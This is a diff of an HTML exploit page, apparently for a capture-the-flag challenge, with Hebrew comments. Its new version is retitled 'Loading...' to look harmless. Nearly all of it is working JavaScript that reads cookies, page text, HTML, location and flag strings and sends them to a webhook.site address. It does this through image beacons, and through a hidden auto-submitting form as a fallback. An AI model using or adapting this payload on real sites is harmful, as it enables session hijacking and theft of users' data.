@@ -1,44 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>IMDS CTF Exploit</title>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
 </head>
 <body>
-  <h1>Running IMDS Exploit...</h1>
+  <h1>Running Exploit...</h1>
+  <form id="exfil" action="https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d" method="POST">
+    <input type="hidden" name="document_title" id="document_title">
+    <input type="hidden" name="document_cookie" id="document_cookie">
+    <input type="hidden" name="document_body" id="document_body">
+    <input type="hidden" name="document_location" id="document_location">
+  </form>
+
   <script>
-(function() {
-  const base = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';
+    // פונקציית שליחה בטוחה
+    function send(name, data) {
+      const img = new Image();
+      img.src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?' + name + '=' + encodeURIComponent(data);
+    }
 
-  // 1. ניסיון לגשת ל- /flag
-  fetch('/flag')
-    .then(r => r.text())
-    .then(flag => {
-      send('flag', flag);
-    })
-    .catch(err => {
-      send('fetch_error', err.toString());
-    });
+    // שליחה דרך form POST (אם fetch חסום)
+    function exfilForm(data) {
+      document.getElementById('document_title').value = document.title;
+      document.getElementById('document_cookie').value = document.cookie;
+      document.getElementById('document_body').value = document.body.innerText;
+      document.getElementById('document_location').value = location.href;
+      document.getElementById('exfil').submit();
+    }
 
-  // 2. שליחת כל הדף
-  send('html', document.documentElement.outerHTML);
+    try {
+      // שלח מידע בסיסי
+      send('title', document.title);
+      send('cookie', document.cookie);
+      send('location', location.href);
 
-  // 3. שליחת קובצי עוגיות
-  send('cookie', document.cookie);
+      // נסה לשלוף דגל מתוך הדף
+      const flagLike = document.body.innerText.match(/CTF\{.*?\}/);
+      if (flagLike) {
+        send('flag', flagLike[0]);
+      } else {
+        // נסה לשלוח את כל הדף
+        send('html', document.documentElement.outerHTML);
+      }
 
-  // 4. שליחת location
-  send('location', location.href);
-
-  // 5. שליחת title
-  send('title', document.title);
-
-  // פונקציה שולחת ל-webhook
-  function send(type, data) {
-    const img = new Image();
-    img.src = `${base}?${type}=` + encodeURIComponent(data);
-  }
-})();
-</script>
+      // נסה גם עם form POST
+      setTimeout(exfilForm, 1000);
+    } catch (e) {
+      send('error', e.toString());
+    }
+  </script>
 </body>
 </html>
-
